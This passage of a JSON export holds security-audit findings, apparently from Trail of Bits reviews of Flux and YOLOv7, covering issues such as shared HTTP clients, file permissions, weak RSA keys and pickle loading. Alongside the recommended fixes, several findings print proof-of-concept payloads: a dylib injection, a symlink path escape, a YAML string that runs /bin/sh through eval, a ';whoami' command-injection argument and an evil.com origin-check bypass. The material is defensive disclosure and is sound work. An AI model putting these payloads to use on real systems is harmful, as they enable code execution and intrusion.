        "body": "Go's default HTTP client uses a shared http.DefaultClient value that can be modied by other application components, which leads to unexpected behavior. In the case of Flux, the issue arises in the GetLatestVersion and ExistingVersion functions, where the timeout is modied. func GetLatestVersion() ( string , error ) { 91 // GetLatestVersion calls the GitHub API and returns the latest released version 92 93 94 95 96 97 ghURL := \"https://api.github.com/repos/fluxcd/flux2/releases/latest\" c := http.DefaultClient c.Timeout = 15 * time.Second res, err := c.Get(ghURL) Figure 3.1: The GetLatestVersion function that uses http.DefaultClient ( flux2/pkg/manifestgen/install/install.go#9197 ) func ExistingVersion(version string ) ( bool , error ) { 118 // (...) 123 ghURL := fmt.Sprintf( \"https://api.github.com/repos/fluxcd/flux2/releases/tags/%s\" , version) 124 125 c := http.DefaultClient c.Timeout = 15 * time.Second Figure 3.2: The ExistingVersion function that uses http.DefaultClient ( flux2/pkg/manifestgen/install/install.go#118125 ) Exploit Scenario An attacker introduces a malicious library into the Flux codebase that can modify the shared http.DefaultClient value. By manipulating this value, the attacker orchestrates DoS attacks, disrupting the softwares normal operation. Recommendations Short term, avoid using the shared http.DefaultClient value and instead use the go-cleanhttp package to ensure that the HTTP client conguration remains unaected by other parts of the application. Long term, periodically audit other global values that may impact dierent components within Flux. References  hashicorp/go-cleanhttp wrapping functions for accessing \"clean\" Go http.Client values  PoC showing shared global variable used by the default HTTP client",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Unhandled error value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "The eventsCmdRun function in the flux2 repository ignores an error value returned by a call to the getRows function. This can result in incorrect error reporting to the user. 129 rows, err := getRows(ctx, kubeclient, clientListOpts, refListOpts, showNamespace) 130 131 132 133 134 if len (rows) == 0 { if eventArgs.allNamespaces { logger.Failuref( \"No events found.\" ) } else { logger.Failuref( \"No events found in %s namespace.\" , *kubeconfigArgs.Namespace) } 135 136 137 138 } return nil Figure 4.1: Ignored err value ( flux2/cmd/flux/events.go#129-138 ) The getRows function returns a nil value in the rows variable whenever it returns an error, which means the if statements condition on line 130 will be satised. The if statement body will incorrectly report to the user that no events were found, rather than printing the err value. Recommendations Short term, add an err != nil check and modify the eventsCmdRun function to handle error values accordingly (print an error message and then return err ), as shown in the following gure: rows, err := getRows(ctx, kubeclient, clientListOpts, refListOpts, showNamespace) if err != nil { logger.Failuref( \"Error while getting rows: %s\" , err) return err } if len (rows) == 0 { if eventArgs.allNamespaces { logger.Failuref( \"No events found.\" ) } else { logger.Failuref( \"No events found in %s namespace.\" , *kubeconfigArgs.Namespace) } return nil } Figure 4.2: Fixed code snippet Long term, ensure that there are no other places in the Flux codebase where error values are ignored. Adding CodeQL to the project CI/CD with the queries: security-and-quality option will allow the go/useless-assignment-to-local query to catch similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Potential implicit memory aliasing in for loops ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "Throughout the Flux codebase, loop range values are passed by reference to functions. This reference is unstable and is updated at each iteration of the for loop. Here are two examples: for _, resource := range resources.Items { if err := s.annotate(ctx, &resource ); err != nil { Figure 5.1: Example of memory aliasing in a for loop ( notification-controller/internal/server/receiver_handlers.go#411-412 ) for _, i := range list.Items { if !bucket.GetArtifact().HasRevision(i.Status.ObservedSourceArtifactRevision) { client.ObjectKeyFromObject( &i )}) reqs = append (reqs, reconcile.Request{NamespacedName: Figure 5.2: Example of memory aliasing in a for loop ( source-controller/internal/controller/helmchart_controller.go#1312-1314 ) We did not nd any examples where this results in a security problem. However, it is generally a very unsafe practice; if any of these function calls preserved their input values (e.g., by storing them in structs), the stored value would be changed while the for loop was iterating. A full list of occurrences of this issue can be found in appendix D . Recommendations Short term, replace these references with more permanent ones. Here are two possible ways to do this: for i, v := range l { // option 1: reference the entry in the list // the reference still only lasts as long as the list does foo(&l[i]) // option 2: copy the value before calling the function vClone := v foo(&vClone) } Figure 5.3: Safer ways to pass a reference to a function Long term, implement the gosec tool in the project CI/CD to catch potential issues with Golang. References  Beware of Implicit Memory Aliasing in Go For Loop",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Directories created via os.MkdirAll are not checked for permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "Flux creates certain directory paths with specic access permissions by using the os.MkdirAll function. This function does not perform any permission checks when a given directory path already exists. This would allow a local attacker to create a directory with broad permissions before Flux could create the directory with narrower permissions, possibly allowing the attacker to later tamper with the les. A full list of occurrences of this issue can be found in appendix D . Exploit Scenario Eve has unprivileged access to a container running a Flux controller. Eve introduces new directories or paths with 0777 permissions before the Flux code does so. Eve then deletes and forges les in that directory to change the result of further code executed by the Flux controller. Recommendations Short term, when using functions such as os.MkdirAll , os.WriteFile , or outil.WriteFile , check all directories in the path and validate their owner and permissions before performing operations on them. This will help avoid situations where sensitive information is written to a preexisting attacker-controlled path. Long term, enumerate les and directories for their expected permissions, and build validation to ensure appropriate permissions are applied before creation and upon use. Ideally, this validation should be centrally dened and used throughout the application as a whole.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Directories and les created with overly lenient permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "Flux creates various directories and les with overly lenient permissions. This would allow an attacker with unprivileged access to edit, delete, and read les, interfering with Flux controllers operations. if err := os.MkdirAll(abs, 0 o755); err != nil { Figure 7.1: Example of a directory created with overly lenient permissions ( pkg/tar/tar.go#167 ) err = os.WriteFile(path, out, 0 o644) Figure 7.2: Example of a le created with overly lenient permissions ( kustomize-controller/internal/decryptor/decryptor.go#505 ) A full list of occurrences of this issue can be found in appendix D . Recommendations Short term, generally use permissions of 0750 or less for directories and 0600 or less for les. Long term, enumerate les and directories for their expected permissions overall, and build validation to ensure appropriate permissions are applied before creation and upon use. Ideally, this validation should be centrally dened and used throughout the application as a whole.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. No restriction on minimum SSH RSA public key bit size ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "Flux does not restrict a user from creating a Kubernetes secret for Git authentication using a dangerous SSH RSA public key bit size (gure 8.1). A user can create a conguration with a 16-bit key size (gure 8.2), which is insecure because an attacker can easily brute force the correct private key that matches the public key. var defaultRSAKeyBits = 2048 type RSAKeyBits int // (...) func (b *RSAKeyBits) Set(str string ) error { if strings.TrimSpace(str) == \"\" { *b = RSAKeyBits(defaultRSAKeyBits) return nil } bits, err := strconv.Atoi(str) if err != nil { return err } if bits == 0 || bits% 8 != 0 { return fmt.Errorf( \"RSA key bit size must be a multiples of 8\" ) } *b = RSAKeyBits(bits) return nil } Figure 8.1: The Set function responsible for the --ssh-rsa-bits parameter validation ( flux2/internal/flags/rsa_key_bits.go#2547 ) $ flux create secret git podinfo-auth \\ --url=ssh://git@github.com/stefanprodan/podinfo \\ --export --ssh-rsa-bits 16 --ssh-key-algorithm=rsa --- apiVersion: v1 kind: Secret metadata: name: podinfo-auth namespace: flux-system stringData: identity: | -----BEGIN PRIVATE KEY----- MDoCAQAwDQYJKoZIhvcNAQEBBQAEJjAkAgEAAgMAsDkCAwEAAQICMZECAgDlAgIA xQICAJUCAgCRAgFd -----END PRIVATE KEY----- identity.pub: | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAAwCwOQ == Figure 8.2: The flux command to create a Kubernetes secret for Git authentication using a 16-bit RSA public key Recommendations Short term, implement a strict minimum requirement of 1024 bits for the SSH RSA public key size. This will ensure that users cannot create Kubernetes secrets with dangerously small key sizes, such as the 16-bit example shown in gure 8.2. By enforcing a larger key size, the system's security will signicantly improve because it will be much more resistant to brute-force attacks. Long term, periodically review other Flux arguments to ensure they do not allow insecure congurations.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Flux macOS release binary susceptible to .dylib injection ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "The Flux macOS release binary does not have Hardened Runtime restrictions enabled (gure 9.1), making the binary vulnerable to a .dylib le injection attack. A .dylib injection attack allows an attacker to inject a custom dynamic library (.dylib) into a process, potentially leading to, for example, unauthorized access to sensitive information. $ brew install fluxcd/tap/flux $ codesign -dvvv ` which flux ` /usr/local/bin/flux: code object is not signed at all Figure 9.1: Installing the ocial release of Flux by Homebrew and using the codesign tool to check whether the binary has the kSecCodeSignatureEnforcement ag enabled $ cat inj.c #include <stdio.h> // The constructor attribute causes the function to be called automatically before before main() is called __attribute__((constructor)) static void customConstructor(int argc, const char **argv) { printf(\"Successfully injected dylib\\n\"); } # Exporting the DYLD_INSERT_LIBRARIES environment variable to inject dynamic libraries into other running processes $ export DYLD_INSERT_LIBRARIES=`pwd`/inj.dylib $ flux Successfully injected dylib Command line utility for assembling Kubernetes CD pipelines the GitOps way. (...) Figure 9.2: The proof of concept showing that the custom .dylib le can be successfully injected into the flux process Exploit Scenario An attacker gains access to a target users machine and crafts a malicious .dylib to steal passwords from the standard Flux input. Then the attacker sets the DYLD_INSERT_LIBRARIES environment variable in the .zshrc le to the path of the crafted .dylib. The user executes the flux bootstrap github command with the --token-auth parameter and provides a GitHub personal access token through standard input. As a result, the hijacked access token is sent to the attacker. Recommendations Short term, sign the release macOS Flux binaries and verify that the code signature ags include the kSecCodeSignatureEnforcement ag to ensure the Hardened Runtime protects the binary. The code signature ags are displayed in the CodeDirectory line when running the codesign command (gure 9.3):   A 0x0 ag indicates that the binary has a standard code signature without additional features. A 0x10000 ag ( kSecCodeSignatureEnforcement ) indicates that the application has implemented runtime hardening policies. $ codesign -dvvv ` which kubectl ` Executable =/Applications/Docker.app/Contents/Resources/bin/kubectl Identifier =kubectl Format =Mach-O thin (x86_64) CodeDirectory v = 20500 size = 431283 flags =0x10000(runtime) hashes = 13472 +2 location =embedded Figure 9.3: An example that uses the codesign tool to show a hardened kubectl binary Long term, implement automatic checks in the project CI/CD pipeline to ensure the release binary has Hardened Runtime restrictions enabled. References   DYLIB Injection in Golang apps on Apple silicon chips A Deep Dive into Penetration Testing of macOS Applications (Part 2)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Path traversal in SecureJoin implementation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-flux-securityreview.pdf",
        "body": "The SecureJoinVFS function in pkg/git/gogit/fs is meant to join two paths, root and unsafePath , with the condition that the returned path must be scoped within root . However, it is possible for an attacker to cause the function to return a path outside the root directory by crafting a symlink in the root directory. This compromises the methods on the OS struct in the pkg/git/gogit/fs library. Here is a portion of the code for SecureJoinVFS : 99 100 101 // Absolute symlinks reset any work we've already done. if filepath.IsAbs(dest) { if !fi.IsDir() && strings.HasPrefix(dest, root+ string (filepath.Separator)) { 102 103 104 105 } return filepath.Clean(dest), nil } path.Reset() Figure 10.1: Code snippet from SecureJoinVFS ( pkg/git/gogit/fs/join.go#L99-L105 ) The if statements on lines 100 and 101 check that dest (the destination of a symlink) is an absolute path that has root/ as a prex. In this case, dest is returned. However, it is possible for dest to both begin with root/ and not be a child of root . For instance, /tmp/rootDir/../a.txt begins with /tmp/rootDir/ but is not a descendent of /tmp/rootDir/ (it resolves to /tmp/a.txt ). Here is a proof of concept showing how an attacker could write to a le outside the root directory: $ # STATE OF THE FILESYSTEM BEFORE MAIN.GO IS RUN; NOTE THE SYMLINK IN ROOTDIR $ pwd /tmp/poc $ ls -l rootDir total lrwxr-xr-x 1 sam wheel 42 Aug 2 17:25 file.txt -> /tmp/poc/rootDir/../unrelatedDir/pwned.txt $ ls -l unrelatedDir total 0 $ # MAIN.GO SHOULD LEAVE EVERYTHING OUTSIDE OF ROOTDIR UNTOUCHED, SINCE IT USES THE SECURE FILE SYSTEM $ cat main.go package main import ( \"fmt\" \"github.com/fluxcd/pkg/git/gogit/fs\" \"os\" ) func main() { // Secure file system rooted in rootDir my_os := fs.New( \"/tmp/poc/rootDir\" ) // Open file.txt and write hello to it; shouldnt affect anything outside of rootDir f, err := my_os.OpenFile( \"file.txt\" , os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600 ) if err != nil { fmt.Println(err) return } _, err = f.Write([] byte ( \"hello\\n\" )) if err != nil { fmt.Println(err) return } err = f.Close() if err != nil { fmt.Println(err) return } // To indicate that we havent hit any errors fmt.Println( \"success\" ) } $ go run main.go success $ ls -l rootDir total 0 lrwxr-xr-x 1 sam wheel 42 Aug 2 17:25 file.txt -> /tmp/poc/rootDir/../unrelatedDir/pwned.txt $ ls -l unrelatedDir total -rw------- 1 sam wheel 6 Aug 2 17:27 pwned.txt $ cat unrelatedDir/pwned.txt hello $ # A file in unrelatedDir got written to because of the malicious symlink Figure 10.2: Proof of concept to demonstrate breaking out of SecureJoin root directory This issue will be high severity when the pkg/git/gogit/fs library is considered on its own because its main security guarantee is that it should not be possible to read or write outside the root directory. However, due to the time-boxed nature of this audit, we did not determine whether there is a way to exploit this vulnerability to aect Flux as a whole. Recommendations Short term, remove the return statement in gure 10.1, line 102; the loop should continue even when a symlink with an absolute path is hit, and the return statement at the end of the function (line 114) is not susceptible to this vulnerability. Long term, expand unit tests to catch similar issues. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Multiple uses of subprocess.check_output with shell=True could allow command injection ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "Various parts of the codebase rely on various shell commands to obtain relevant information for the user. For instance, as shown in gure 1.1, the git_describe function uses subprocess.check_output to run a git command. Functions such as subprocess.check_output are permissive functions that allow arbitrary commands to be run; as a result, it is important that these functions are used carefully to prevent command injection attacks, where an attacker crafts malicious input that results in subprocess.check_output running a malicious command. def git_describe(path=Path(__file__).parent): # path must be a directory # return human-readable git description, i.e. v5.0-5-g3e25f1e 54 55 https://git-scm.com/docs/git-describe 56 57 58 stderr=subprocess.STDOUT).decode()[:-1] 59 60 return '' except subprocess.CalledProcessError as e: # not a git repository s = f'git -C {path} describe --tags --long --always' try: return subprocess.check_output(s, shell=True, Figure 1.1: Snippet of git_describe in utils/torch_utils.py def check_git_status(): # Recommend 'git pull' if code is out of date print(colorstr('github: '), end='') try: 72 73 74 75 76 77 78 79 cmd = 'git fetch && git config --get remote.origin.url' 80 81 url = subprocess.check_output(cmd, shell=True).decode().strip().rstrip('.git') # github repo url 82 assert Path('.git').exists(), 'skipping check (not a git repository)' assert not isdocker(), 'skipping check (Docker image)' assert check_online(), 'skipping check (offline)' branch = subprocess.check_output('git rev-parse --abbrev-ref HEAD', n = int(subprocess.check_output(f'git rev-list {branch}..origin/master # checked out # commits behind s = f\" WARNING: code is out of date by {n} commit{'s' * (n > f\"Use 'git pull' to update or 'git clone {url}' to download if n > 0: shell=True).decode().strip() 83 --count', shell=True)) 84 85 1)}. \" \\ 86 latest.\" 87 88 89 90 91 print(e) else: s = f'up to date with {url} ' print(emojis(s)) # emoji-safe except Exception as e: Figure 1.2: Snippet of check_git_status in utils/general.py It is recommended that functions like subprocess.check_output and subprocess.run are called with the input command parameterized in an array (rather than as a single string) and with shell=False (the default). The reason for this is that when shell=False, these subprocess functions will execute only if each element in the parameterized input array does not contain whitespace. This will prevent any sort of command injection attack, even when the attack can control some of the values in the parameterized input. However, as shown in gures 1.1 and 1.2, multiple locations in the YOLOv7 codebase call subprocess.check_output with a single string for the command and shell=True. Here are all the instances of subprocess.check_output being called with shell=True:  utils/general.py lines 81, 82, 83, and 114  utils/google_utils.py lines 15 and 31  utils/torch_utils.py line 58 Exploit Scenario An attacker crafts a malicious command that they would like to inject into an instance of subprocess.check_output. This attacker forces their target victim to use a directory path or a git branch that contains this malicious command as a substring, which allows them to inject a command into subprocess.check_output in either gure 1.1 or gure 1.2. Recommendations Short term, call subprocess.check_output with shell=False in all instances. Also, use a parameterized input array rather than constructing a single string for the command being called. Long term, review all instances of subprocess, eval, os.system, and any other permissive functions to ensure they are being used safely. In addition, consider replacing these instances with safer internal Python API calls. For instance, consider using GitPython rather than using subprocess.check_output to obtain git information.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Models are stored and loaded as pickle les throughout the YOLO codebase ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "Throughout the YOLOv7 codebase, models are serialized and loaded using functions such as torch.load and torch.save, which rely on pickle les. Pickle les have become prevalent in the machine learning space for serializing models because their exibility makes it possible to serialize several kinds of models without much eort. However, pickle les are known to be insecure, as they allow the execution of arbitrary code. If any of these pickle les are obtained from an untrusted source, an attacker could inject malicious code into the pickle le, which would run on the victim's machine. Figure 1.1 shows one of several locations that rely on torch.load to load models. This instance is particularly risky because the model can potentially be downloaded from an external source using the attempt_download function. If an attacker is able to compromise the site that hosts these models, they would obtain a vector for remote code execution. def create(name, pretrained, channels, classes, autoshape): \"\"\"Creates a specified model Arguments: name (str): name of model, i.e. 'yolov7' pretrained (bool): load pretrained weights into the model channels (int): number of input channels classes (int): number of model classes Returns: pytorch model \"\"\" try: cfg = list((Path(__file__).parent / 'cfg').rglob(f'{name}.yaml'))[0] # model.yaml path model = Model(cfg, channels, classes) if pretrained: fname = f'{name}.pt' # checkpoint filename attempt_download(fname) # download if not found locally ckpt = torch.load(fname, map_location=torch.device('cpu')) # load Figure 2.1: snippet of create in hubconf.py We consider this issue to have high diculty because, in order to exploit it, an attacker must be able to serve a malicious pickle le to a target victim. It is possible that if an attacker is able to serve these malicious les, then they likely have the ability to perform other attacks directly, although this may not always be possible. Moreover, malicious pickle les are much more dicult to detect without proper inspection, as it is possible for these les to execute malicious code and still correctly load the model les. Exploit Scenario An attacker serves a malicious pickle le that exltrates all of the victims credentials and sends them to a server controlled by the attacker. The attacker carefully crafts the pickle le so that after the credentials have been exltrated, the YOLO model still loads correctly, and the victim does not detect anything malicious. Recommendations Short term, when loading PyTorch models, use the weights_only unpickler and load_state_dict(); consider using ckling to detect possible malicious pickle les before loading them. Long term, use a safer serialization format, such as safetensors or ONNX, which allows for the serialization of complex models without allowing for the execution of arbitrary code. References  Never a dill moment: Exploiting machine learning pickle les",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Parsing of YAML cong le can lead to arbitrary code execution ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "When initiating a Model class in train.py, it can take a YAML as a conguration le for the backbone of a model architecture. The conguration le is parsed by the parse_model function in models/yolo.py. The function uses an eval function on lines in the conguration le, as shown in gure 3.1. 742 743 744 745 746 layers, save, c2 = [], [], ch[-1] for i, (f, n, m, args) in enumerate(d['backbone'] + d['head']): m = eval(m) if isinstance(m, str) else m for j, a in enumerate(args): try: Figure 3.1: Snippet of parse_model in models/yolo.py The eval function allows execution of arbitrary expressions from a string. Without proper validation of inputs, an attacker could inject malicious code to execute on a victims machine. In model.py, the function checks only if the current instance is a string and inputs it to eval without any proper validation. Exploit Scenario An adversary replaces a list of numbers with a list of a single, malicious string in the backbone section of the conguration le while keeping the rest of the conguration le the same, as shown in gure 3.2. 13 14 15 16 17 backbone: [[-1, 1, Conv, [\"__import__('os').system('/bin/sh')\"]], [-1, 1, Conv, [64, 3, 2]], [-1, 1, Bottleneck, [64]], [-1, 1, Bottleneck, [64]], Figure 3.2: Snippet of a malicious conguration YAML le When given this conguration le, the parse_model function evaluates the string as code and executes it. In this example, os.system was used to open a shell. When the user trains their data in train.py, they load this YAML le using the cfg ag in the command line. Unset python3 train.py --workers 8 --device 0 --batch-size 32 --data data/coco.yaml --img 640 640 --cfg cfg/baseline/yolov7-malicious.yaml --weights '' --name yolov7 --hyp data/hyp.scratch.p5.yaml Recommendations Short term, remove the usage of eval entirely and instead either construct the objects explicitly or use a modeling library such as Pydantic. Long term, review all instances of subprocess, eval, os.system, and any other permissive functions to ensure they are being used safely. In addition, consider replacing these instances with safer internal Python API calls, such as those described in the short term recommendation.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Untrusted pre-trained models can lead to arbitrary code execution ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "The same vulnerability mentioned in nding TOB-YOLO-3 can be exploited using a pretrained model. In train.py, the user is allowed to provide a conguration YAML le as architecture backbone or a *.pt le as a pretrained model. 88 model = Model(opt.cfg or ckpt['model'].yaml, ch=3, nc=nc, \\ anchors=hyp.get('anchors')).to(device) Figure 4.1: Creating a model class using the pretrained file The pretrained model can have an attribute called yaml, which is similar to the YAML used for the model architecture except that it is a Python dictionary. Since the parsing is the same, the vulnerability is still present, and the eval function can be exploited by crafting a malicious pretrained le. Exploit Scenario The attacker writes their own Model class with an attribute called yaml that is a dictionary with the same properties as a YAML le used as a conguration le. The victim user creates an instance of that class and stores it in a dictionary with the string 'model' as a key and the object as its value. The victim user then saves the dictionary as a *.pt le using PyTorch, which creates a malicious pretrained le. The victim user then loads the pretrained le in the command line using the weights ag. Unset python3 train.py --workers 8 --device 0 --batch-size 32 --data data/coco.yaml --img 640 640 --weights 'maliciousyolov7.pt' --name yolov7 --hyp data/hyp.scratch.p5.yaml This exploit is dicult to detect due to the serialization of the object. Recommendations Short term, support only pretrained weights from the GitHub repo with a checksum to ensure the downloaded pretrained le is not malicious. Long term, use a safer serialization format, such as safetensors or ONNX, which allows for the serialization of complex models without allowing for the execution of arbitrary code.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Multiple uses of os.system could allow command injection ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "The codebase uses Pythons os.system to invoke certain commands. These are susceptible to malicious command injections. Certain commands, such as gsutil, unzip and curl, are executed as shell commands via Pythons os.system. An example can be found in the train.py script. if opt.bucket: os.system(f'gsutil cp {final} gs://{opt.bucket}/weights') # upload Figure 5.1: Use of os.system in the train function in train.py This particular use of os.system is vulnerable to command injection. By including the command line argument --bucket \";whoami\", we can invoke arbitrary commands as the current user. The full command to be executed might look like this: python train.py --bucket \";whoami\" --data data/coco.yaml --img 640 640 --cfg cfg/training/yolov7.yaml --weights '' --name yolov7 --hyp data/hyp.scratch.p5.yaml --epochs 1 Figure 5.2: Example command line injection for train.py Another problematic instance of os.system is in the check_dataset function: def check_dataset(dict): # Download dataset if not found locally val, s = dict.get('val'), dict.get('download') if val and len(val): val = [Path(x).resolve() for x in (val if isinstance(val, list) else [val])] # val path if not all(x.exists() for x in val): print('\\nWARNING: Dataset not found, nonexistent paths: %s' % [str(x) for x in val if not x.exists()]) if s and len(s): # download script print('Downloading %s ...' % s) if s.startswith('http') and s.endswith('.zip'): # URL f = Path(s).name # filename torch.hub.download_url_to_file(s, f) r = os.system('unzip -q %s -d ../ && rm %s' % (f, f)) # unzip else: # bash script r = os.system(s) print('Dataset autodownload %s\\n' % ('success' if r == 0 else 'failure')) # analyze return value else: raise Exception('Dataset not found.') Figure 5.3: Use of os.system in the check_dataset function in utils/general.py As highlighted in gure 5.3, the check_dataset function takes in a dictionary, which contains a download script s. If s is not a URL containing the substring `http` and `zip`, then check_dataset will execute an arbitrary command by calling os.system(s). This is particularly problematic because this function is called in both train.py and test.py with the dictionary value obtained from a YAML le specied by the user. If an attacker was able to compromise such a YAML le, this would introduce an arbitrary code execution vulnerability. Throughout the repository, there are many uses of os.system, many of which (but not all) are susceptible in the same way:  test.py#L352  train_aux.py#L430  train_aux.py#L512  train_aux.py#L656  train.py#L433  train.py#L515  train.py#L662  utils/general.py#L168  utils/general.py#L170  utils/general.py#L826  utils/general.py#L844  utils/google_utils.py#L47  utils/google_utils.py#L67  utils/google_utils.py#L72  utils/google_utils.py#L84  utils/plots.py#L410  utils/aws/resume.py#L37 Exploit Scenario The YOLOv7 repository is deployed as a cloud service for paying customers. Eve, a malicious user, spots the vulnerability and injects a command that starts a remote shell execution environment that she can access from her computer. She is now in control of the servers. Recommendations Short term, be vigilant when handling user-provided inputs. Heavily limit or sanitize these in order to reduce the expressivity of inputs. Extra care should be given to strings or inputs of arbitrary length, especially when these are being used in combination with commands that are able to execute arbitrary commands. Long term, review all instances of subprocess, eval, os.system, and any other permissive functions to ensure they are being used safely. In addition, consider replacing these instances with safer internal Python API calls.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Use of unencrypted HTTP protocol ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "YOLOv7 uses the unencrypted HTTP protocol in the documentation to download MS COCO dataset images (gure 6.1), which could allow an attacker to intercept and modify both the request and response of a victim user in the same network. The attacker could then manipulate the training set. 83 84 85 86 87 88 89 90 91 ## Training Data preparation ``` shell bash scripts/get_coco.sh ``` * Download MS COCO dataset images ([train](http://images.cocodataset.org/zips/train2017.zip), [val](http://images.cocodataset.org/zips/val2017.zip), [test](http://images.cocodataset.org/zips/test2017.zip)) Figure 6.1: Part of the YOLOv7 documentation that uses HTTP protocol to download dataset images (yolov7/README.md#8391) Exploit Scenario Eve gains access to Alices network and modies Alices downloaded training data to obtain specic recognizing behavior of YOLOv7. Recommendations Short term, enforce the use of the HTTPS URL scheme in the YOLOv7 documentation. Long term, review any YOLOv7 code that contains external links and ensure that those links do not use the HTTP protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Insecure origin check ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "YOLOv7 insecurely checks the origin of the URLs (gure 7.1) by checking for youtube.com/ or youtu.be/ anywhere in the URL string. This validation can be bypassed by using any domain and the youtube.com/ or youtu.be/ strings as a parameter. 285 if 'youtube.com/' in str(url) or 'youtu.be/' in str(url): # if source is YouTube video Figure 7.1: Insecure origin check implementation (yolov7/utils/datasets.py#285) We have rated this issue as low severity because it aects the model only during detection. This issue would be more severe if this occurred during training, as this could allow an attacker to poison the training data and perform a backdoor attack or generally degrade the models performance. Exploit Scenario Eve creates a malicious website, evil.com, and crafts a URL that passes the application's origin check, such as evil.com/whatever?evilparam=youtube.com/. Eve then tricks Alice into using the deceptive link. Alice, who is unaware of the malicious link, downloads a tainted video, and her YOLO model performs very poorly. Alice then loses valuable time attempting to debug her model before realizing the issue was with her video. Recommendations Short term, ensure that youtube.com or youtu.be strings are present in the main domain section of the URL. Be aware of deceptive subdomain usage, as allowed strings can be used as subdomains (e.g., youtube.com.evil.com). Long term, incorporate CodeQL into your development process to avoid incomplete URL substring sanitization.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. The check_dataset function downloads and unzips les from arbitrary URLs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "The check_dataset function is used throughout the codebase to see if a dataset exists at a particular directory path; if the dataset does not exist, then the check_dataset function attempts to download the dataset by either downloading a zip le or running a bash script specied in the input. 156 157 158 159 160 def check_dataset(dict): # Download dataset if not found locally val, s = dict.get('val'), dict.get('download') if val and len(val): val = [Path(x).resolve() for x in (val if isinstance(val, list) else [val])] # val path 161 162 if not all(x.exists() for x in val): print('\\nWARNING: Dataset not found, nonexistent paths: %s' % [str(x) for x in val if not x.exists()]) 163 164 165 166 167 168 unzip 169 170 171 if s and len(s): # download script print('Downloading %s ...' % s) if s.startswith('http') and s.endswith('.zip'): # URL # filename f = Path(s).name torch.hub.download_url_to_file(s, f) r = os.system('unzip -q %s -d ../ && rm %s' % (f, f)) # else: # bash script r = os.system(s) print('Dataset autodownload %s\\n' % ('success' if r == 0 else 'failure')) # analyze return value 172 173 else: raise Exception('Dataset not found.') Figure 8.1: check_dataset function downloads and unzips from arbitrary URLs This could be highly problematic in some instances. For example, in the test.py le, this function is called on the data variable that is obtained from reading a YAML le that is specied via a command line argument. If this YAML le is corrupted, an attacker could inject a URL that will result in the target user unzipping a zip bomb that halts execution of the model. Exploit Scenario A malicious actor corrupts the dataset YAML le being used by a target user during training and injects a malicious download URL. The target user does not inspect their YAML les closely and unknowingly downloads and unzips a zip bomb that halts execution of their model. Recommendations Short term, validate the zip le before unzipping to prevent a zip bomb attack. For example, check the size of the le and do not unzip it if it is too large. Long term, limit which URLs users can download les from or carefully verify that downloaded les can be trusted before unzipping them. 9. Insu\u0000cient input validation in triton inference server could result in uncaught exception at runtime Severity: Medium Diculty: High Type: Denial of Service Finding ID: TOB-YOLO-9 Target: deploy/triton-inference-server",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Project lacks adequate testing framework ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
